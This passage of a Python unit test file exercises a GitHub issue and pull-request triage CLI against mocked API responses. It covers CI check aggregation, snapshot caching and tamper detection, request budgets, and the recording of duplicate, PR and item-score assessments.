            return dict(dict(id=identifier, head_sha=sha, app=app, check_suite=dict(id=10), name="build", status="completed", conclusion="success",
                             started_at="2026-09-22T02:00:00Z", completed_at="2026-09-22T02:01:00Z", details_url="https://github.com/owner/repo/actions/runs/20"), **changes)

        def status(identifier=30, **changes):
            return dict(dict(id=identifier, context="external", state="success", created_at="2026-09-22T02:00:00Z", target_url="https://ci.example/build"), **changes)

        def sources(suites, runs, statuses):
            self.responses[prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=len(suites), check_suites=suites))
            for selected in suites:
                values = [value for value in runs if value["check_suite"]["id"] == selected["id"]]
                self.responses[f"repos/owner/repo/check-suites/{selected['id']}/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=len(values), check_runs=values))

            self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(data=statuses)

        sources([suite()], [run(19, conclusion="failure", started_at="2026-09-22T01:00:00Z"), run()],
                [status(31, context="EXTERNAL", created_at="2026-09-22T03:00:00Z"), status(state="failure")])
        selected = self.json_cli("pr-checks", *args, "--mode", "refresh", "--limit", "1")
        self.assertEqual((selected["coverage"], selected["freshness"], selected["observed_result"]), ("complete", "within-window", "passed"))
        self.assertEqual(selected["raw_count"], 5)
        self.assertEqual(selected["result_counts"], dict(passed=2, failed=0, pending=0, unknown=0))
        self.assertEqual(selected["pagination"]["total"], 2)
        self.assertEqual(selected["historical_or_suite_omissions"], 3)
        self.assertFalse(any("/files" in call or "/reviews" in call or "/comments" in call for call in self.calls()))
        count = len(self.calls())
        fixed = self.json_cli("pr-checks", *args, "--snapshot", selected["snapshot_id"], "--offset", "1", "--limit", "1")
        self.assertEqual((fixed["rows"][0]["name"], fixed["rows"][0]["result"]), ("EXTERNAL", "passed"))
        self.assertEqual(fixed["rows"][0]["source_reference"]["snapshot_id"], selected["snapshot_id"])
        self.assertEqual(len(self.calls()), count)
        self.run_cli("pr-checks", *args, "--offset", "1", ok=False)
        self.run_cli("pr-checks", *args, "--snapshot", selected["snapshot_id"], "--mode", "refresh", ok=False)
        self.run_cli("pr-checks", "--expected-repo", "other/repo", "--number", "1", ok=False)
        self.assertEqual(len(self.calls()), count)
        raw = self.json_cli("cache", *selected["raw_command"][1:], "--limit", "20")
        self.assertIn('"failure"', raw["text"])

        sources([suite(status="queued", conclusion=None)], [run(status="queued", conclusion=None, started_at=None, completed_at=None)], [])
        sole_queued = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(sole_queued["observed_result"], "pending")
        self.assertEqual(next(value for value in sole_queued["rows"] if value["source"] == "check-run")["result"], "pending")

        sources([suite()], [run(), run(21, status="queued", conclusion=None, started_at=None, completed_at=None)],
                [status(31, state="pending", created_at="2026-09-22T03:00:00Z"), status()])
        active = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertNotEqual(active["observed_result"], "passed")
        self.assertTrue(any(value["status"] == "queued" for value in active["rows"]))
        self.assertEqual(next(value for value in active["rows"] if value["source"] == "status")["result"], "pending")

        sources([suite(), suite(12)], [run(), run(22, check_suite=dict(id=12), started_at="2026-09-22T04:00:00Z")], [])
        ambiguous = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(ambiguous["observed_result"], "unknown")
        ambiguous_runs = [value for value in ambiguous["rows"] if value["source"] == "check-run"]
        self.assertEqual(len(ambiguous_runs), 2)
        self.assertEqual(sum(value["source"] == "check-suite" for value in ambiguous["rows"]), 2)
        self.assertTrue(all(any("spans suites" in problem for problem in value["problems"]) for value in ambiguous_runs))
        sources([suite(), suite(12, status="in_progress", conclusion=None)], [run()], [])
        suite_only = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(suite_only["observed_result"], "pending")
        self.assertTrue(any(value["source"] == "check-suite" for value in suite_only["rows"]))
        self.assertFalse(any("completed_at is missing" in value["problems"] for value in suite_only["rows"] if value["source"] == "check-suite"))

        # A suite waiting for approval has no check runs, so the waiting run listing names it; the run of another suite is not retained.
        sources([suite(conclusion="action_required")], [], [])
        self.responses[f"repos/owner/repo/actions/runs?head_sha={sha}&status=action_required&per_page=100&page=1"] = dict(data=dict(total_count=2, workflow_runs=[
            dict(id=70, name="Fork checks", check_suite_id=10, head_sha=sha, repository=repository()), dict(id=71, name="Elsewhere", check_suite_id=99, head_sha=sha, repository=repository())]))
        awaiting = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(awaiting["observed_result"], "pending")
        self.assertEqual(awaiting["result_counts"], dict(passed=0, failed=0, pending=1, unknown=0))
        self.assertEqual(awaiting["rows"][0]["name"], "Fork checks")
        self.assertTrue(any("action required" in problem for problem in awaiting["rows"][0]["problems"]))
        self.assertFalse(any("job" in problem for problem in awaiting["rows"][0]["problems"]))
        self.assertFalse(awaiting["rows"][0]["log_capture_supported"])

        other_app = dict(id=12, name="Another CI")
        sources([suite(), suite(12, app=other_app)], [run(), run(22, app=other_app, check_suite=dict(id=12))], [])
        separate_apps = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(separate_apps["observed_result"], "passed")
        self.assertEqual({value["app"] for value in separate_apps["rows"]}, {"CI", "Another CI"})
        sources([suite()], [run(20 + index, name=f"failure-{index}", conclusion="failure") for index in range(10)] + [run(40, name="aaa-passed")],
                [status(state="failure"), status(31, context="passed")])
        many = self.json_cli("pr-checks", *args, "--mode", "refresh", "--limit", "2")
        self.assertTrue(all(value["result"] == "failed" for value in many["rows"]))
        before = len(self.calls())
        bounded_logs = self.json_cli("pr-checks", *args, "--snapshot", many["snapshot_id"], "--limit", "50", "--include-failure-logs")
        check_logs = [value["failure_log"] for value in bounded_logs["rows"] if value["source"] == "check-run" and value["result"] == "failed"]
        self.assertEqual(sum(value["state"] == "missing" for value in check_logs), 8)
        self.assertEqual(sum(value["state"] == "not-shown" for value in check_logs), 2)
        priority_args = (*args, "--snapshot", many["snapshot_id"], "--include-failure-logs", "--failure-log-check-id", "29", "--failure-log-source-repo", "owner/repo")
        prioritized = self.json_cli("pr-checks", *priority_args, "--limit", "50")
        self.assertEqual([value["internal_id"] for value in prioritized["rows"]], [value["internal_id"] for value in bounded_logs["rows"]])
        self.assertEqual(next(value["failure_log"]["state"] for value in prioritized["rows"] if value["internal_id"] == 29), "missing")
        self.assertEqual(sum(value["failure_log"]["state"] == "not-shown" for value in prioritized["rows"] if value["source"] == "check-run" and value["result"] == "failed"), 2)
        self.run_cli("pr-checks", *priority_args, "--limit", "2", ok=False)
        self.run_cli("pr-checks", *args, "--snapshot", many["snapshot_id"], "--failure-log-check-id", "29", "--failure-log-source-repo", "owner/repo", ok=False)
        status_log = next(value["failure_log"] for value in bounded_logs["rows"] if value["source"] == "status" and value["result"] == "failed")
        self.assertEqual(status_log["state"], "unavailable")
        self.assertIn("no individual Actions job log linkage", status_log["problem"])
        self.assertEqual(len(self.calls()), before)
        external_app = dict(app, slug="external-ci")
        sources([suite(app=external_app)], [run(app=external_app, conclusion="failure")], [])
        external = self.json_cli("pr-checks", *args, "--mode", "refresh", "--include-failure-logs")
        external_log = next(value["failure_log"] for value in external["rows"] if value["source"] == "check-run")
        self.assertEqual(external_log["state"], "unavailable")
        self.assertIn("this provider", external_log["problem"])
        self.assertFalse(next(value for value in external["rows"] if value["source"] == "check-run")["log_capture_supported"])
        before = len(self.calls())
        unsupported = self.json_cli("pr-check-log", "capture", *args, "--snapshot", external["snapshot_id"], "--check-id", "20")
        self.assertEqual((unsupported["status"], unsupported["requests"]), ("unavailable", 0))
        self.assertNotIn("log_object", unsupported)
        self.assertEqual(len(self.calls()), before)
        sources([suite(conclusion="failure")], [run()], [])
        contradictory = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(contradictory["observed_result"], "unknown")
        actions_app = dict(app, slug="github-actions")
        sources([suite(app=actions_app, conclusion="failure")],
                [run(app=actions_app, name="passing-job"), run(21, app=actions_app, name="failed-job", conclusion="failure")], [])
        explained_failure = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(explained_failure["result_counts"], dict(passed=1, failed=1, pending=0, unknown=0))
        self.assertEqual(explained_failure["historical_or_suite_omissions"], 1)
        self.assertTrue(next(value for value in explained_failure["rows"] if value["result"] == "failed")["log_capture_supported"])
        self.assertFalse(next(value for value in explained_failure["rows"] if value["result"] == "passed")["log_capture_supported"])
        sources([suite(conclusion="failure")], [run(19, conclusion="failure", started_at="2026-09-22T01:00:00Z"), run()], [])
        historical_failure = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(historical_failure["result_counts"]["unknown"], 1)
        self.assertEqual(historical_failure["result_counts"]["failed"], 0)
        sources([suite(conclusion="failure")], [run(conclusion="cancelled")], [])
        unmatched_conclusion = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(unmatched_conclusion["result_counts"]["unknown"], 1)
        sources([suite()], [run(conclusion="failure")], [])
        contradictory_success = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(contradictory_success["result_counts"]["unknown"], 1)
        sources([suite(conclusion="failure")], [run(conclusion="failure"), run(21, name="pending-job", status="queued", conclusion=None, started_at=None, completed_at=None)], [])
        pending_child = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(pending_child["result_counts"]["unknown"], 1)
        sources([suite(conclusion="failure")], [run(conclusion="failure")], [])
        self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(status=500, data=[])
        partial_failure = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertNotEqual(partial_failure["coverage"], "complete")
        self.assertEqual(partial_failure["result_counts"]["unknown"], 1)
        self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(data=[])

        fork = dict(full_name="fork/repo", id=43, node_id="R_fork")
        self.responses["repos/owner/repo/pulls/1"]["data"]["head"]["repo"] = fork
        self.responses["repos/fork/repo"] = dict(data=fork)
        fork_prefix = f"repos/fork/repo/commits/{sha}"
        self.responses[fork_prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=1, check_suites=[suite(conclusion="failure")]))
        self.responses["repos/fork/repo/check-suites/10/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=1, check_runs=[run(conclusion="failure")]))
        self.responses[fork_prefix + "/statuses?per_page=100&page=1"] = dict(data=[])
        sources([suite()], [run()], [])
        fork_checks = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(fork_checks["observed_result"], "failed")
        self.assertEqual(fork_checks["result_counts"], dict(passed=1, failed=1, pending=0, unknown=0))
        self.assertEqual({value["repository"] for value in fork_checks["rows"]}, {"owner/repo", "fork/repo"})
        self.assertEqual(len(fork_checks["allowed_repositories"]), 2)
        self.responses["repos/owner/repo/pulls/1"]["data"]["head"]["repo"] = repository()

        sources([], [], [])
        budgeted = self.json_cli("pr-checks", *args, "--mode", "refresh", "--request-budget", "3")
        self.assertLessEqual(budgeted["requests"], 3)
        self.assertNotEqual(budgeted["observed_result"], "passed")
        empty = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual((empty["coverage"], empty["observed_result"]), ("complete", "empty"))
        self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(status=404, data=dict(message="not found"))
        partial = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual((partial["coverage"], partial["freshness"], partial["observed_result"]), ("partial", "within-window", "unknown"))
        self.assertTrue(partial["problems"])

        sources([suite()], [run(name="x" * 10000, details_url="https://ci.example/" + "x" * 3000)], [])
        bounded = self.json_cli("pr-checks", *args, "--mode", "refresh")
        self.assertEqual(len(bounded["rows"][0]["name"]), 256)
        self.assertIsNone(bounded["rows"][0]["url"])
        self.assertTrue(bounded["rows"][0]["problems"])
        sources([suite()], [run()], [])
        sound = self.json_cli("pr-checks", *args, "--mode", "refresh")
        manifest = self.cache("show", sound["snapshot_id"])
        self.responses["repos/owner/repo/pulls/1"]["data"]["head"]["sha"] = "c" * 40
        self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion", "--mode", "refresh")
        moved = self.json_cli("pr-checks", *args)
        self.assertEqual((moved["observed_head_sha"], moved["checks_head_sha"], moved["freshness"], moved["observed_result"]), ("c" * 40, sha, "stale", "unknown"))
        self.assertEqual(self.json_cli("pr-checks", *args, "--snapshot", sound["snapshot_id"])["observed_result"], "passed")
        cache_root = self.root / "data/owner/repo/cache"
        descriptor = manifest["items"][0]["components"]["checks"]
        payload = json.loads((cache_root / "objects" / (descriptor["object"]["sha256"] + ".json")).read_text())

        def forged(change, observed_at=None):
            altered = copy.deepcopy(manifest)
            rows = copy.deepcopy(payload)
            change(rows)
            text = json.dumps(rows, sort_keys=True, separators=(",", ":")) + "\n"
            reference = dict(sha256=hashlib.sha256(text.encode()).hexdigest(), bytes=len(text.encode()), format="json")
            altered["items"][0]["components"]["checks"]["object"] = reference
            if observed_at is not None:
                altered["items"][0]["components"]["checks"]["fetched_at"] = observed_at
            (cache_root / "objects" / (reference["sha256"] + ".json")).write_text(text)
            altered.pop("snapshot_id")
            identity = hashlib.sha256(json.dumps(altered, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
            altered["snapshot_id"] = identity
            (cache_root / "snapshots" / (identity + ".json")).write_text(json.dumps(altered))
            return identity

        old_observation = "2026-09-23T00:00:00Z"
        historical = forged(lambda values: [value.update(fetched_at=old_observation) for value in values], observed_at=old_observation)
        stale = self.json_cli("pr-checks", *args, "--snapshot", historical)
        self.assertEqual((stale["freshness"], stale["observed_result"]), ("stale", "unknown"))
        count = len(self.calls())
        for change in (lambda values: values[1].update(repository=dict(host="github.com", full_name="foreign/repo", database_id=99, node_id="R_foreign")),
                       lambda values: values[1].update(head_sha="c" * 40),
                       lambda values: values[1]["data"].update(check_suite=dict(id=99)),
                       lambda values: values[1]["data"].update(id=True),
                       lambda values: values[1]["data"].update(app=[]),
                       lambda values: values[1]["data"].update(check_suite=[]),
                       lambda values: values[1].update(fetched_at="2099-01-01T00:00:00Z")):
            self.run_cli("pr-checks", *args, "--snapshot", forged(change), ok=False)

        self.assertEqual(len(self.calls()), count)
        object_path = cache_root / "objects" / (descriptor["object"]["sha256"] + ".json")
        object_path.write_text("corrupt")
        self.run_cli("pr-checks", *args, "--snapshot", sound["snapshot_id"], ok=False)
        self.assertEqual(len(self.calls()), count)

    def test_selected_acquisition_and_offline_reuse(self):
        first = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
        self.assertFalse(any(first["problems"].values()))
        count = len(self.calls())
        fixed = self.cache("read", "--kind", "pr", "--number", "1", "--profile", "discussion", "--snapshot", first["snapshot_id"])
        self.assertEqual(fixed["data"]["summary"]["body"], "Useful source text")
        self.assertEqual(len(self.calls()), count)
        self.assertFalse((self.root / "data/owner/repo/ledger.jsonl").exists())

        listing = self.cache("list", "--snapshot", first["snapshot_id"])
        command = listing["items"][0]["components"]["summary"]["read_command"]
        chunk = self.json_cli(command[0].removeprefix("bin/"), *command[1:], "--max-bytes", "7")
        text = chunk["text"]
        while chunk["next_command"]:
            command = chunk["next_command"]
            chunk = self.json_cli(command[0].removeprefix("bin/"), *command[1:])
            self.assertEqual(chunk["snapshot_id"], first["snapshot_id"])
            text += chunk["text"]

        self.assertEqual(json.loads(text)["body"], "Useful source text")
        self.assertEqual(len(self.calls()), count)
        wrong_type = self.run_cli("cache", "list", "--snapshot", "v1:" + "a" * 64, ok=False)
        self.assertIn("expected an immutable snapshot ID", wrong_type.stderr)
        unknown = self.run_cli("cache", "list", "--snapshot", "0" * 64, ok=False)
        self.assertIn("selected immutable snapshot is not retained", unknown.stderr)
        self.run_cli("cache", "--expected-repo", "other/repo", "list", "--snapshot", first["snapshot_id"], ok=False)
        self.assertEqual(len(self.calls()), count)

        ledger = self.root / "data/owner/repo/ledger.jsonl"
        row = item(1, "A contribution", kind="pr")
        row["updated_at"] = summary()["updated_at"]
        ledger.write_text(json.dumps(row) + "\n")
        self.run_cli("batch", "1", "--cache-mode", "offline", "--snapshot", first["snapshot_id"], "--request-budget", "0")
        batch = next((self.root / "data/owner/repo/batches").glob("*.items.jsonl"))
        self.assertEqual(json.loads(batch.read_text())["number"], 1)
        self.assertEqual(len(self.calls()), count)

        for mode, budget in (("refresh", "0"), ("cache-preferred", "0"), ("offline", "-1")):
            rejected = self.run_cli("batch", "1", "--cache-mode", mode, "--request-budget", budget, ok=False)
            self.assertIn("--request-budget must be positive", rejected.stderr)

        self.assertEqual(len(self.calls()), count)

    def test_duplicate_comparison_keeps_unresolved_pair_and_both_selected_revisions(self):
        rows = []
        snapshots = {}
        for number in (2, 3):
            issue = summary(kind="issue", number=number, title=f"Related report {number}")
            self.responses[f"repos/owner/repo/issues/{number}"] = dict(data=issue)
            self.responses[f"repos/owner/repo/issues/{number}/comments?per_page=100&page=1"] = dict(data=[])
            row = item(number, issue["title"])
            row["updated_at"] = issue["updated_at"]
            rows.append(row)

        ledger = self.root / "data/owner/repo/ledger.jsonl"
        ledger.write_text("\n".join(json.dumps(row) for row in rows) + "\n")
        for number in (2, 3):
            snapshots[number] = self.cache("fetch", "--kind", "issue", "--number", str(number), "--profile", "discussion")["snapshot_id"]

        calls = len(self.calls())
        args = ("--expected-repo", "owner/repo", "record", "--evidence", f"issue:2:{snapshots[2]}",
                "--evidence", f"issue:3:{snapshots[3]}", "--outcome", "unresolved",
                "--shared", "Both describe the same screen", "--difference", "The trigger is not established",
                "--gap", "Need a reproduction from #3", "--by", "agent:tester")
        saved = self.json_cli("duplicate-assessment", *args)
        self.assertEqual(saved["pair"], dict(kind="issue", a=2, b=3))
        self.assertEqual(saved["outcome"], "unresolved")
        self.assertEqual(self.json_cli("duplicate-assessment", "--expected-repo", "owner/repo", "list")["records"][0]["assessment_id"], saved["assessment_id"])
        self.assertEqual([row["snapshot_id"] for row in saved["evidence"]], [snapshots[2], snapshots[3]])
        self.assertEqual(self.json_cli("duplicate-assessment", *args), saved)
        shown = self.json_cli("duplicate-assessment", "--expected-repo", "owner/repo", "show", saved["assessment_id"])
        self.assertTrue(all(row["current"] for row in shown["current"]))
        self.assertEqual(len(self.calls()), calls)

        grouped = self.json_cli("group-assessment", "--expected-repo", "owner/repo", "record", "--scope-type", "topic",
                                "--topic", "Related screen reports", "--evidence", f"issue:2:{snapshots[2]}",
                                "--evidence", f"issue:3:{snapshots[3]}", "--outcome", "no-group",
                                "--reason", "Trigger overlap is too uncertain for a maintainer group", "--by", "agent:tester")
        self.assertIsNone(grouped["group"])
        self.assertEqual(grouped["scope"]["member_keys"], ["issue:2", "issue:3"])
        self.assertEqual(self.json_cli("group-assessment", "--expected-repo", "owner/repo", "list")["records"][0]["assessment_id"], grouped["assessment_id"])
        self.assertEqual(len(self.calls()), calls)

        rows[1]["updated_at"] = "2026-10-07T00:00:00Z"
        ledger.write_text("\n".join(json.dumps(row) for row in rows) + "\n")
        changed = self.json_cli("duplicate-assessment", "--expected-repo", "owner/repo", "show", saved["assessment_id"])
        self.assertEqual([row["current"] for row in changed["current"]], [True, False])
        group_status = self.json_cli("group-assessment", "--expected-repo", "owner/repo", "show", grouped["assessment_id"])
        self.assertEqual([row["ledger_revision_current"] for row in group_status["current"]["sources"]], [True, False])
        refreshed = self.json_cli("duplicate-assessment", *args)
        self.assertNotIn("confidence", refreshed)
        self.assertIn("Need a reproduction from #3", refreshed["gaps"])
        self.assertIn("issue:3: selected revision differs from the ledger", refreshed["gaps"])
        self.assertIn("unrecognized arguments: --confidence high", self.run_cli("duplicate-assessment", *args, "--confidence", "high", ok=False).stderr)

        partial = self.cache("fetch", "--kind", "issue", "--number", "2", "--profile", "discussion", "--mode", "refresh", "--request-budget", "2")
        partial_args = [f"issue:2:{partial['snapshot_id']}" if value == f"issue:2:{snapshots[2]}" else value for value in args]
        calls = len(self.calls())
        incomplete = self.json_cli("duplicate-assessment", *partial_args)
        self.assertIn("issue:2: comments is not complete", incomplete["gaps"])
        self.assertIn("Need a reproduction from #3", incomplete["gaps"])
        self.assertIn("issue:3: selected revision differs from the ledger", incomplete["gaps"])
        self.assertEqual(len(self.calls()), calls)

        self.json_cli("not-duplicate", "--key", "issue:2", "--key", "issue:3", "--by", "maintainer", "--note", "Different triggers")
        duplicate = list(args)
        duplicate[duplicate.index("unresolved")] = "duplicate"
        self.assertIn("not-duplicate verdict", self.run_cli("duplicate-assessment", *duplicate, ok=False).stderr)

    def test_pr_review_and_keep_open_assessments_bind_head_and_coverage(self):
        pr = item(1, "A contribution", kind="pr")
        pr["updated_at"] = summary()["updated_at"]
        ledger = self.root / "data/owner/repo/ledger.jsonl"
        ledger.write_text(json.dumps(pr) + "\n")
        selected = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "discussion")
        calls = len(self.calls())
        common = ("--expected-repo", "owner/repo", "record", "--number", "1", "--snapshot", selected["snapshot_id"],
                  "--code-read", "partial", "--base-comparison", "unavailable", "--by", "agent:tester")
        review = self.json_cli("pr-assessment", *common, "--purpose", "review", "--outcome", "no-finding",
                               "--reason", "No issue found in the available discussion and summary")
        self.assertEqual(review["evidence"]["revision"]["head_sha"], "b" * 40)
        self.assertIn("diff is not complete", review["gaps"])
        self.assertEqual(review["code"]["read"], "partial")
        self.assertEqual(self.json_cli("pr-assessment", *common, "--purpose", "closure", "--outcome", "keep-open",
                                       "--reason", "Code and feedback need review")["outcome"], "keep-open")
        self.assertIn("ready reviews require", self.run_cli("pr-assessment", *common, "--purpose", "review", "--outcome", "ready",
                                                               "--reason", "Merge now", ok=False).stderr)
        self.assertIn("needs a pending exact closure proposal", self.run_cli("pr-assessment", *common, "--purpose", "closure",
                                                                            "--outcome", "close", "--reason", "Superseded", ok=False).stderr)
        shown = self.json_cli("pr-assessment", "--expected-repo", "owner/repo", "show", review["assessment_id"])
        self.assertTrue(shown["current"]["ledger_revision_current"])
        self.assertEqual(len(self.calls()), calls)

        patch_text = "@@ -1,1 +1,1 @@\n-old\n+new"
        self.responses["repos/owner/repo/pulls/1"]["data"].update(changed_files=1, additions=1, deletions=1)
        self.responses["repos/owner/repo/pulls/1#diff"] = dict(text="diff --git a/app.py b/app.py\nindex 1111111..2222222 100644\n--- a/app.py\n+++ b/app.py\n" + patch_text)
        self.responses["repos/owner/repo/pulls/1/files?per_page=100&page=1"] = dict(data=[dict(filename="app.py", status="modified", additions=1, deletions=1, changes=2, patch=patch_text)])
        complete = self.cache("fetch", "--kind", "pr", "--number", "1", "--profile", "pr-code", "--mode", "refresh")
        ready_args = ("--expected-repo", "owner/repo", "record", "--number", "1", "--snapshot", complete["snapshot_id"],
                      "--code-read", "full", "--base-comparison", "verified", "--by", "agent:tester",
                      "--purpose", "review", "--outcome", "ready", "--reason", "Reviewed the complete change")
        calls = len(self.calls())
        disabled_ready = self.json_cli("pr-assessment", *ready_args)
        self.assertFalse(disabled_ready["ci"]["required"])
        self.assertIsNone(disabled_ready["ci"]["evidence"])
        policy_args = ("--expected-repo", "owner/repo")
        disabled = self.json_cli("ci-policy", "status", *policy_args)
        enabled = self.json_cli("ci-policy", "set-enabled", *policy_args, "--enabled", "on", "--expected-revision", disabled["revision"])
        self.run_cli("pr-assessment", *ready_args, ok=False)
        self.assertFalse(self.json_cli("pr-assessment", *policy_args, "show", disabled_ready["assessment_id"])["current"]["ci_policy_current"])
        self.assertEqual(self.json_cli("pr-assessment", *common, "--purpose", "review", "--outcome", "blocked", "--reason", "Awaiting further evidence")["outcome"], "blocked")
        self.assertEqual(self.json_cli("pr-assessment", *common, "--purpose", "closure", "--outcome", "keep-open", "--reason", "Code needs review")["outcome"], "keep-open")
        self.assertEqual(len(self.calls()), calls)

        sha = "b" * 40
        prefix = f"repos/owner/repo/commits/{sha}"
        self.responses[prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=0, check_suites=[]))
        check_args = ("--expected-repo", "owner/repo", "--number", "1", "--mode", "refresh")
        for conclusion in ("skipped", "neutral"):
            app = dict(id=11, name="CI")
            suite = dict(id=10, head_sha=sha, app=app, status="completed", conclusion="success")
            run = dict(id=20, head_sha=sha, app=app, check_suite=dict(id=10), name="build", status="completed", conclusion=conclusion,
                       started_at="2026-09-22T02:00:00Z", completed_at="2026-09-22T02:01:00Z")
            self.responses[prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=1, check_suites=[suite]))
            self.responses["repos/owner/repo/check-suites/10/check-runs?filter=all&per_page=100&page=1"] = dict(data=dict(total_count=1, check_runs=[run]))
            self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(data=[])
            checks = self.json_cli("pr-checks", *check_args)
            calls = len(self.calls())
            self.run_cli("pr-assessment", *ready_args, "--checks-snapshot", checks["snapshot_id"], ok=False)
            self.assertEqual(len(self.calls()), calls)

        self.responses[prefix + "/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=0, check_suites=[]))
        for state in ("failure", "pending", "unknown", None, "success"):
            statuses = [] if state is None else [dict(id=30, context="build", state=state, created_at="2026-09-22T02:00:00Z")]
            self.responses[prefix + "/statuses?per_page=100&page=1"] = dict(data=statuses)
            checks = self.json_cli("pr-checks", *check_args)
            calls = len(self.calls())
            if state != "success":
                self.run_cli("pr-assessment", *ready_args, "--checks-snapshot", checks["snapshot_id"], ok=False)
            else:
                passed = self.json_cli("pr-assessment", *ready_args, "--checks-snapshot", checks["snapshot_id"])
                self.assertTrue(passed["ci"]["required"])
                self.assertEqual(passed["ci"]["evidence"]["snapshot_id"], checks["snapshot_id"])
                self.assertEqual(passed["ci"]["evidence"]["observed_result"], "passed")
                self.assertEqual(passed["ci"]["evidence"]["head_sha"], sha)

            self.assertEqual(len(self.calls()), calls)

        # Retain a valid historical snapshot with old observation times; fixed reads must not refresh it.
        manifest = self.cache("show", checks["snapshot_id"])
        cache_root = self.root / "data/owner/repo/cache"
        old = copy.deepcopy(manifest)
        descriptor = old["items"][0]["components"]["checks"]
        payload = json.loads((cache_root / "objects" / (descriptor["object"]["sha256"] + ".json")).read_text())
        descriptor["fetched_at"] = "2026-09-23T00:00:00Z"
        for value in payload:
            value["fetched_at"] = descriptor["fetched_at"]

        text = json.dumps(payload, sort_keys=True, separators=(",", ":")) + "\n"
        descriptor["object"] = dict(sha256=hashlib.sha256(text.encode()).hexdigest(), bytes=len(text.encode()), format="json")
        (cache_root / "objects" / (descriptor["object"]["sha256"] + ".json")).write_text(text)
        old.pop("snapshot_id")
        old_id = hashlib.sha256(json.dumps(old, sort_keys=True, separators=(",", ":")).encode()).hexdigest()
        old["snapshot_id"] = old_id
        (cache_root / "snapshots" / (old_id + ".json")).write_text(json.dumps(old))
        self.run_cli("pr-assessment", *ready_args, "--checks-snapshot", old_id, ok=False)
        self.assertEqual(len(self.calls()), calls)

        partial = self.json_cli("pr-checks", *check_args, "--request-budget", "2")
        calls = len(self.calls())
        self.assertNotEqual(partial["coverage"], "complete")
        self.run_cli("pr-assessment", *ready_args, "--checks-snapshot", partial["snapshot_id"], ok=False)
        self.assertEqual(len(self.calls()), calls)
        self.responses["repos/owner/repo/pulls/1"]["data"]["head"]["sha"] = "c" * 40
        self.responses[f"repos/owner/repo/commits/{'c' * 40}/check-suites?per_page=100&page=1"] = dict(data=dict(total_count=0, check_suites=[]))
        self.responses[f"repos/owner/repo/commits/{'c' * 40}/statuses?per_page=100&page=1"] = dict(data=[dict(id=31, context="build", state="success", created_at="2026-09-22T02:00:00Z")])
        moved = self.json_cli("pr-checks", *check_args)
        calls = len(self.calls())
        self.assertIn("exact selected PR head", self.run_cli("pr-assessment", *ready_args, "--checks-snapshot", moved["snapshot_id"], ok=False).stderr)
        self.json_cli("ci-policy", "set-enabled", *policy_args, "--enabled", "off", "--expected-revision", enabled["revision"])
        historical = self.json_cli("pr-assessment", *policy_args, "show", passed["assessment_id"])
        self.assertFalse(historical["current"]["ci_policy_current"])
        self.assertFalse(historical["current"]["ci_policy"]["enabled"])
        self.assertEqual(historical["record"], passed)
        self.assertEqual(len(self.calls()), calls)

        pr["updated_at"] = "2026-10-07T00:00:00Z"
        ledger.write_text(json.dumps(pr) + "\n")
        self.assertFalse(self.json_cli("pr-assessment", "--expected-repo", "owner/repo", "show", review["assessment_id"])["current"]["ledger_revision_current"])

    def test_item_score_binds_numeric_assessment_to_verified_revision(self):
        issue = summary(kind="issue", number=2)
        self.responses["repos/owner/repo/issues/2"] = dict(data=issue)
        self.responses["repos/owner/repo/issues/2/comments?per_page=100&page=1"] = dict(data=[])
        row = item(2, issue["title"])
        row["updated_at"] = issue["updated_at"]
        row.update(action="")
        (self.root / "data/owner/repo/ledger.jsonl").write_text(json.dumps(row) + "\n")

        selected = self.cache("fetch", "--kind", "issue", "--number", "2", "--profile", "discussion")
        calls = len(self.calls())
        args = ("--expected-repo", "owner/repo", "set", "--kind", "issue", "--number", "2")
        unclear = self.run_cli("item-score", *args, "--snapshot", selected["snapshot_id"], "--clarity", "2", "--support", "1",
                               "--actionability", "1", "--reason", "The case looks good", "--by", "agent:tester", ok=False)
        self.assertIn("numeric reason must start with Clarity 2:", unclear.stderr)
        self.assertIsNone(self.ledger()["issue", 2].get("item_score"))
        scored = self.json_cli("item-score", *args, "--snapshot", selected["snapshot_id"], "--clarity", "2", "--support", "1",
                               "--actionability", "1", "--reason", "Clarity 2: Goal is clear. Support 1: One example is present. Actionability 1: Check the named case.", "--by", "agent:tester")
        self.assertEqual(scored["score"]["value"], 4)
        self.assertEqual(scored["score"]["dimensions"], dict(clarity=2, support=1, actionability=1))
        self.assertEqual(self.json_cli("item-score", "--expected-repo", "owner/repo", "show", "--kind", "issue", "--number", "2")["current"], True)
        self.assertEqual(len(self.calls()), calls)
        self.assertIsNone(self.ledger()["issue", 2]["review_request"])

        changed = self.ledger()["issue", 2]
        changed["updated_at"] = "2026-09-23T01:00:00Z"
